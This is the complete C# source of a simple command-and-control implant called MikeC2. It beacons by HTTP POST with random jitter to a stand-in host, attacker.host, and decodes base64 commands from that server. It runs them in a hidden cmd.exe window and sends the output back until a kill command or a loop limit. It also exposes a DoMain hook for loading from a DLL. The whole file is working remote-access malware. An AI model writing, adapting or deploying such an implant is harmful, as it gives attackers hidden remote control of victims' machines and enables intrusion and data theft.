using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Net;
using System.Collections.Specialized;
//using Newtonsoft.Json;
using System.Text.RegularExpressions;


namespace MikeC2
{
    public class C2Response
    {
        public string uuid { get; set; }
        public string cmd { get; set; }
    }
    class Program
    {
        private static readonly WebClient client = new WebClient();
        private static int jitter = 1000;
        private static int timeout = 2000;
        private static int killcount = 50;

        private string uuid = "";
        private string result = "";

        // Will execute a command using cmd.exe
        public string ExecCmd(string cmd)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo = new System.Diagnostics.ProcessStartInfo()
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                FileName = "cmd.exe",
                Arguments = "/c " + cmd,
                RedirectStandardError = true,
                RedirectStandardOutput = true
            };
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            return output;
        }

        // Send response via a HTTP POST request to the attacker C2 server
        public void DoHTTP(NameValueCollection data)
        {
            var response = client.UploadValues("http://attacker.host/endpoint.php", "POST", data);
            string responseString = Encoding.UTF8.GetString(response);
            //Console.WriteLine(responseString);

            // Better way to parse JSON, but requires Newtonsoft JSON nuget include
            //var c2_response = new C2Response();
            //c2_response = JsonConvert.DeserializeObject<C2Response>(responseString);

            // Parse JSON using a regex
            Dictionary<string, string> c2_response = new Dictionary<string, string>();
            c2_response = this.ParseJSON(responseString);


            // debug
            /*
            foreach (KeyValuePair<string, string> kvp in c2_response)
            {
                Console.WriteLine("Key = {0}, Value = {1}", kvp.Key, kvp.Value);
            }
            */

            if (c2_response != null)
            {
                // New uuid session check in
                if (this.uuid == "")
                {
                    if (c2_response.ContainsKey("uuid"))
                    {
                        Console.WriteLine("C2 client check in: " + c2_response["uuid"]);
                        this.uuid = c2_response["uuid"];
                    }
                }


                // Quit is asked, otherwise execute the provided command
                if (c2_response.ContainsKey("cmd"))
                {
                    string cmd = Encoding.UTF8.GetString(Convert.FromBase64String(c2_response["cmd"]));

                    if (cmd == "kill")
                    {
                        // Kill C2 client
                        Console.WriteLine("Quitting...");
                        Environment.Exit(0);
                    }
                    else
                    {
                        // Blindly trust and execute anything sent :-)
                        Console.WriteLine("Executing: " + cmd);
                        this.result = this.ExecCmd(cmd);
                        Console.WriteLine("Result: " + this.result);
                    }
                }
            }


        }

        // Calculate next C2 ping timeout
        public static int getNextTimeout()
        {
            Random random = new Random();
            int timeout = MikeC2.Program.timeout;
            timeout = (int)(random.NextDouble() * jitter) + MikeC2.Program.timeout;
            return timeout;
        }


        // Continue to communicate with the C2 server until the kill count has been reached
        // unless the C2 client is told to exit by the server beforehand
        public void LoopHTTP()
        {
            int count = 0;
            int timeout = 0;

            while (count < MikeC2.Program.killcount)
            {
                var data = new NameValueCollection();
                data["uuid"] = this.uuid;
                data["result"] = this.result;

                this.DoHTTP(data);
                timeout = getNextTimeout();
                //Console.WriteLine(timeout);
                Thread.Sleep(timeout);
                count++;
            }
        }

        // Modified from:
        // https://stackoverflow.com/questions/408570/regular-expression-to-parse-an-array-of-json-objects
        public Dictionary<string, string> ParseJSON(string s)
        {
            Regex r = new Regex("\"(?<Key>[\\w]*)\":\"?(?<Value>([\\s\\w\\d\\.\\\\\\-/:_=\\+]+(,[,\\s\\w\\d\\.\\\\\\-/:_=\\+]*)?)*)\"?");
            MatchCollection mc = r.Matches(s);

            Dictionary<string, string> json = new Dictionary<string, string>();

            foreach (Match k in mc)
            {
                json.Add(k.Groups["Key"].Value, k.Groups["Value"].Value);

            }
            return json;
        }

        // DoMain is a hook that can be called via a DLL
        public static void DoMain()
        {
            var loop = new Program();
            loop.LoopHTTP();

        }

        static void Main(string[] args)
        {
            DoMain();
        }
    }
}
